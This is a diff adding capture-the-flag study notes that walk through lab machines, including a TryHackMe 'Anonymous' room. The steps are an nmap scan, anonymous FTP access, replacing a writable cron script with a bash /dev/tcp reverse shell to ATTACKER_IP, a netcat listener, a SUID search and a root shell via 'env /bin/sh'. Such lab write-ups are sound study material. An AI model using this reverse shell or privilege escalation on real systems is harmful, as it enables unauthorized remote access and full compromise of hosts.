@@ -131,3 +131,53 @@ nmap -sV -sC -v TARGET_IP
 ```
 
 ![[Pasted image 20260322212314.png]]
+
+### 2. Anonymous login
+
+```
+ftp TARGET_IP
+```
+
+We have to enter the username as `anonymous` and blank password. We then list all the files and folders using `ls`. 
+
+Using below command we get the flag file.
+
+```
+ftp> get flag.tcxt
+```
+
+## THM (Anonymous Lab)
+
+### 1. Run a Nmap scan to determine the services running on the target
+
+	We found ftp, ssh, smb running.
+
+### 2. Login into ftp using anonymous username
+
+![[Pasted image 20260325160410.png]]
+
+Now we list the files inside the ftp server and found a clean.sh files. As we have permission to read and write, we updated the clean.sh with a reverse shell.
+
+```
+/bin/bash -l > /dev/tcp/ATTACKER_IP/4242 0<&1 2>&1
+```
+
+Then we use nc to create a listener:
+
+```
+nc -lvp 4242
+```
+
+### Now we look for all the binaries with SUID bit set (which can be used to escalate privileges)
+
+![[Pasted image 20260325161029.png]]
+
+```
+find / -perm -4000 2>/dev/null
+```
+
+We then check for the binaries which can be used to spawn a root shell, we found `/usr/bin/env` to spawn a root shell:
+
+```
+env /bin/sh
+```
